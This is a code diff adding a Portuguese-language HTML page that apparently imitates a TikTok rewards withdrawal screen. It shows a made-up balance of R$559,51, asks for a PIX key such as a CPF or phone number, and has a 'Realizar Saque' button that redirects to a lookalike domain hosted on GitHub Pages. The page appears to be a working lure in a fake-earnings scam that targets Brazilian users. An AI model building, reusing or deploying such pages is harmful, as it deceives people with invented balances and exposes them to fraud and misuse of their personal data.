@@ -1,0 +1,204 @@
+
+<!DOCTYPE html>
+
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Resgatar Recompensas</title>
+<style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 40px 10px;
+      min-height: 100vh;
+      box-sizing: border-box;
+      margin: 0;
+    }
+    .container {
+      background-color: white;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 400px;
+      padding: 24px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+      box-sizing: border-box;
+    }
+    .saldo-box {
+      background: black;
+      color: white;
+      padding: 24px;
+      border-radius: 12px;
+      margin-bottom: 16px;
+    }
+    .saldo-box h2 {
+      margin: 0;
+      font-size: 24px;
+    }
+    .saldo-box p {
+      font-size: 14px;
+      color: #ccc;
+    }
+    .recompensas {
+      background: #000;
+      color: #ccc;
+      padding: 12px;
+      border-radius: 10px;
+      margin-bottom: 24px;
+      font-size: 14px;
+    }
+    .section {
+      margin-bottom: 24px;
+    }
+    .valores {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-bottom: 24px;
+    }
+    .valores button {
+      min-width: 80px;
+      height: 48px;
+      text-align: center;
+      flex: 1;
+      background: #f6f1f8;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .valores button.selected {
+      background: #dbeafe;
+      border: 2px solid #2563eb;
+    }
+    select, input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 24px;
+    }
+    .btn-saque {
+      margin-top: 32px;
+      height: 60px;
+      font-size: 18px;
+      font-weight: 800;
+      border: 2px solid #ff2b57;
+      transition: transform 0.2s ease, background 0.3s ease;
+    
+      margin-top: 32px;
+      transition: transform 0.2s ease, background 0.3s ease;
+    
+      background: #ff2b57;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  
+    .btn-saque:hover {
+      background: #e6003c;
+      transform: scale(1.03);
+    }
+
+    .btn-saque:active {
+      transform: scale(0.97);
+    }
+</style>
+</head>
+<body>
+<div class="container" style=" color: white;">
+<div class="saldo-box" style=" margin-top: -20px; padding-top: 12px; color: white;">
+<div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px; color: white;">
+<span style="color: white; text-decoration: none;">Seu saldo</span>
+<span style="font-size: 12px; color: #ccc;"></span>
+</div>
+<div style="display: flex; align-items: center; justify-content: space-between;">
+<h2 style="font-size: 32px; font-weight: 800;">R$559,51</h2>
+<img alt="Moeda" src="moeda-removebg-preview.png" style="height: 60px; margin-left: 10px; object-fit: contain;"/>
+</div>
+</div>
+<div class="recompensas" style=" margin-top: 8px; display: block;">Últimas recompensas: R$54,87</div>
+<div class="section">
+<p><strong>Sacar dinheiro</strong></p>
+<div style="display: flex; align-items: center; gap: 8px; margin-bottom: 16px;">
+<img alt="Transferência bancária" src="trans.PNG" style="height: 24px;"/>
+<span style="font-weight: bold; font-size: 14px;">Transferência bancária / Pix</span>
+</div>
+<div class="valores">
+<div style="display: flex; gap: 10px; margin-bottom: 12px;">
+<button onclick="selecionarValor(this, 1.5)">R$1,5</button>
+<button onclick="selecionarValor(this, 5)">R$5</button>
+<button onclick="selecionarValor(this, 10)">R$10</button>
+</div>
+<div style="display: flex; justify-content: center; margin-bottom: 24px;">
+<button onclick="selecionarValor(this, 559.51)">R$559,51</button>
+</div>
+</div>
+<select id="tipoChave">
+<option disabled="" selected="">Selecionar o tipo de chave</option>
+<option value="email">E-mail</option>
+<option value="telefone">Telefone</option>
+<option value="cpf">CPF</option>
+<option value="aleatoria">Chave Aleatória</option>
+</select>
+<input placeholder="Digite a sua chave PIX" type="text"/>
+<button class="btn-saque" onclick="window.location.href='https://pesquisasttk.github.io/tiktokpix.online.com.br/'">Realizar Saque</button>
+</div>
+</div>
+<script>
+  let valorSelecionado = null;
+
+  function selecionarValor(btn, valor) {
+    document.querySelectorAll('.valores button').forEach(b => b.classList.remove('selected'));
+    btn.classList.add('selected');
+    valorSelecionado = valor;
+    console.log('Valor selecionado:', valorSelecionado);
+  }
+
+  const inputChave = document.querySelector('input[placeholder="Digite a sua chave PIX"]');
+  const selectTipo = document.getElementById('tipoChave');
+
+  selectTipo.addEventListener('change', () => {
+    const tipo = selectTipo.value;
+
+    inputChave.value = '';
+    inputChave.removeEventListener('input', aplicarMascaraCPF);
+    inputChave.removeEventListener('input', aplicarMascaraTelefone);
+    inputChave.maxLength = 100;
+
+    if (tipo === 'cpf') {
+      inputChave.addEventListener('input', aplicarMascaraCPF);
+      inputChave.maxLength = 14;
+    } else if (tipo === 'telefone') {
+      inputChave.addEventListener('input', aplicarMascaraTelefone);
+      inputChave.maxLength = 15;
+    }
+  });
+
+  function aplicarMascaraCPF(e) {
+    let v = e.target.value.replace(/\D/g, "");
+    if (v.length > 11) v = v.slice(0, 11);
+    v = v.replace(/(\d{3})(\d)/, "$1.$2");
+    v = v.replace(/(\d{3})(\d)/, "$1.$2");
+    v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+    e.target.value = v;
+  }
+
+  function aplicarMascaraTelefone(e) {
+    let v = e.target.value.replace(/\D/g, "");
+    if (v.length > 11) v = v.slice(0, 11);
+    v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
+    v = v.replace(/(\d{5})(\d{1,4})$/, "$1-$2");
+    e.target.value = v;
+  }
+</script>
+</body>
+</html>
